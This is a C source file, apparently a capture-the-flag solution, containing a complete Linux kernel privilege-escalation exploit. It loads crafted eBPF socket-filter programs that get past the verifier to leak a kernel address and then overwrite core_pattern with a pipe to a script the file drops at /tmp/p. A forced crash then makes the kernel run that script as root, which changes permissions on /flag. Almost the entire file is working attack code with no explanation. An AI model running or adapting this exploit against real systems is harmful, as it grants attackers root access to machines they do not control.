#include <sys/syscall.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <assert.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>

#define bpf_ldimm64_or_special(dst_reg, src_reg, imm) \
    bpf_insn(BPF_LD | BPF_DW | BPF_IMM, (dst_reg), (src_reg), 0, (imm) & 0xffffffff), \
    bpf_insn(0, 0, 0, 0, (uint64_t)(imm) >> 32)

#define bpf_load_imm64(dst_reg, imm) bpf_ldimm64_or_special(dst_reg, 0, imm)

// When src_reg == BPF_PSEUDO_MAP_FD, this loads the address of a map into a register
#define bpf_load_map(dst_reg, mapfd) bpf_ldimm64_or_special(dst_reg, BPF_PSEUDO_MAP_FD, mapfd)

const char path_to_exploit[] = "|/tmp/p\x00";

#define LOG_BUF_SIZE 0x10000

static struct bpf_insn bpf_insn(uint8_t opcode, uint8_t dst_reg, uint8_t src_reg, int16_t off, int32_t imm)
{
  struct bpf_insn ret = {
    .code = opcode,
    .dst_reg = dst_reg,
    .src_reg = src_reg,
    .off = off,
    .imm = imm,
  };

  return ret;
}

static struct bpf_insn bpf_load_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_MOV | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_exit(void)
{
  return bpf_insn(BPF_JMP | BPF_EXIT, 0, 0, 0, 0);
}

static struct bpf_insn bpf_xor_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_XOR | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_xor_reg(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_XOR | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_add_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_ADD | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_sub_reg64(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_SUB | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_mov_reg_reg(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_MOV | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_call(int32_t function)
{
  return bpf_insn(BPF_JMP | BPF_CALL, 0, 0, 0, function);
}

static struct bpf_insn bpf_jne_imm(uint8_t reg, int16_t dest, int32_t imm)
{
  return bpf_insn(BPF_JMP | BPF_JNE | BPF_K, reg, 0, dest, imm);
}

// *(int32_t *)(base + offset) = imm
static struct bpf_insn bpf_store_imm32(uint8_t base, int16_t offset, int32_t imm)
{
  return bpf_insn(BPF_MEM | BPF_ST | BPF_W, base, 0, offset, imm);
}

// dst = *(uint64_t *)(base + offset)
static struct bpf_insn bpf_load_reg64(uint8_t dst, uint8_t base, int16_t offset)
{
  return bpf_insn(BPF_MEM | BPF_LDX | BPF_DW, dst, base, offset, 0);
}

// *(uint64_t *)(base + offset) = src
static struct bpf_insn bpf_store_reg64(uint8_t base, int16_t offset, uint8_t src)
{
  return bpf_insn(BPF_MEM | BPF_STX | BPF_DW, base, src, offset, 0);
}

int map_fd;

int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}


int bpf_create_map(enum bpf_map_type map_type,
		 unsigned int key_size,
		 unsigned int value_size,
		 unsigned int max_entries)
{
	union bpf_attr attr = {
	  .map_type    = map_type,
	  .key_size    = key_size,
	  .value_size  = value_size,
	  .max_entries = max_entries
	};

	return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
      union bpf_attr attr = {
	  .map_fd = fd,
	  .key    = key,
	  .value  = value,
      };
	
      assert(syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)) >= 0);

      return;
}

static uint64_t read_map(int mapfd)
{
  uint64_t out = 0;
  uint64_t key = 0;

  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)&out,
  };

  assert(syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)) >= 0);
  return out;
}


int
  bpf_update_elem(int fd, const void *key, const void *value,
		  uint64_t flags)
{
      union bpf_attr attr = {
	  .map_fd = fd,
	  .key    = key,
	  .value  = value,
	  .flags  = flags,
      };

      return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

char bpf_log_buf[LOG_BUF_SIZE];

static int load_prog(const struct bpf_insn *instructions, size_t size)
{
  union bpf_attr attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insns = (uint64_t)instructions,
    .insn_cnt = size,
    .license = (uint64_t)"GPL",
    .log_level = 2,
    .log_buf = (uint64_t)bpf_log_buf,
    .log_size = LOG_BUF_SIZE,
  };

  int ret = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
  if (ret < 0) {
    printf("Verifier returned %d, log: %s\n", ret, bpf_log_buf);
  }
  return ret;
}

void init() {
	system("echo -ne '#!/bin/sh\nchmod 777 /flag' > /tmp/p");
	system("chmod a+x /tmp/p");
}


int main() {

	init();

	map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 
			sizeof(unsigned int),
			sizeof(unsigned long),
			0x40);

	printf("MAP FD: %d\n", map_fd);
	
	const char path_to_exploit[] = "|/tmp/p\x00";

	 const struct bpf_insn instructions[]  = {
        	bpf_load_map(BPF_REG_1, map_fd),
		bpf_store_imm32(BPF_REG_10, -4, 0),
		bpf_mov_reg_reg(BPF_REG_2, BPF_REG_10),
		bpf_add_imm32(BPF_REG_2, -4),
		bpf_call(BPF_FUNC_map_lookup_elem),
		bpf_jne_imm(BPF_REG_0, 1, 0),
		bpf_exit(),

		bpf_xor_imm32(BPF_REG_0, 0),
		bpf_mov_reg_reg(BPF_REG_4, BPF_REG_0),
		bpf_mov_reg_reg(BPF_REG_5, BPF_REG_0),
		
		bpf_xor_reg(BPF_REG_4, BPF_REG_4),
		bpf_xor_imm32(BPF_REG_4, 0),
		bpf_add_imm32(BPF_REG_5, -0x110),
		bpf_xor_reg(BPF_REG_4, BPF_REG_5),

		// now r5 contains a kernel address. (queue_map_ops)
		// Now we put it at index 0 so we can see it later.
		bpf_load_reg64(BPF_REG_5, BPF_REG_4, 0),
		bpf_xor_imm32(BPF_REG_0, 0),
		bpf_store_reg64(BPF_REG_0, 0, BPF_REG_5),
		
		bpf_load_imm32(BPF_REG_0, 0),
		bpf_exit(),

	 };
	 
	int progfd = load_prog(instructions, sizeof(instructions)/sizeof(instructions[0]));
	if(progfd < 0) {
		printf("Something went wrong!\n");
		exit(progfd);
	}
	
	int sockets[2];

	socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
	setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd));
	write(sockets[0], "MAHER", 5);

	unsigned long key = 0, value;
	
	uint64_t leak = read_map(map_fd);
	printf("The first element : %#lx\n", leak);
	unsigned long core_pattern = leak + 0x5c2a20;

	
	struct bpf_insn instructions2[] = {
		bpf_load_map(BPF_REG_1, map_fd),
		bpf_store_imm32(BPF_REG_10, -4, 0),
		bpf_mov_reg_reg(BPF_REG_2, BPF_REG_10),
		bpf_add_imm32(BPF_REG_2, -4),
		bpf_call(BPF_FUNC_map_lookup_elem),
		bpf_jne_imm(BPF_REG_0, 1, 0),
		bpf_exit(),

		bpf_xor_imm32(BPF_REG_0, 0),
		bpf_xor_reg(BPF_REG_0, BPF_REG_0),
		bpf_xor_imm32(BPF_REG_0, 0),

		bpf_load_imm64(BPF_REG_4, core_pattern),
		bpf_xor_reg(BPF_REG_0, BPF_REG_4),
		bpf_load_imm64(BPF_REG_5, *(unsigned long*)path_to_exploit),
		bpf_store_reg64(BPF_REG_0, 0, BPF_REG_5),

		bpf_load_imm32(BPF_REG_0, 0),
		bpf_exit(),
	};

	int progfd2 = load_prog(instructions2, 
			sizeof(instructions2)/sizeof(instructions2[0]));

	if(progfd2 < 0) {
                printf("Something went wrong!\n");
                exit(progfd);
        }

	setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd2, sizeof(progfd2));
	write(sockets[0], "AAAA", 4);
	
	// crash so that our exploit at /tmp can work.
	asm volatile("ud2");

	return 0;
}
